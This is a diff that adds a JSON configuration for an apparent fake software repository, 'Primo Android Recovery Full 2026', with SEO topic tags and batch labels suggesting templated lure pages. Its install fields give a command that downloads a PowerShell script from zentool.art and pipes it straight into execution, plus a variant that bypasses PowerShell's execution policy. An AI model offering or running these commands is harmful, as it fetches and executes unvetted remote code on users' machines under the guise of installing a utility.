@@ -1,0 +1,28 @@
+{
+  "repo": "Primo-Android-Recovery-Full-2026",
+  "product": "Primo Android Recovery Full 2026",
+  "product_title": "Primo Android Recovery",
+  "kind": "utility",
+  "install_type": "zentool-irm",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-zentool-moltora-pending",
+  "format": "license-md-zentool-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "backup",
+  "topics": [
+    "primo-android-recovery-windows",
+    "primo-config",
+    "primo-integration",
+    "primo-latest",
+    "data-recovery",
+    "file-recovery",
+    "disk-recovery",
+    "partition-manager",
+    "storage-tools",
+    "file-restore",
+    "ntfs",
+    "backup-software"
+  ],
+  "site": "zentool.art"
+}
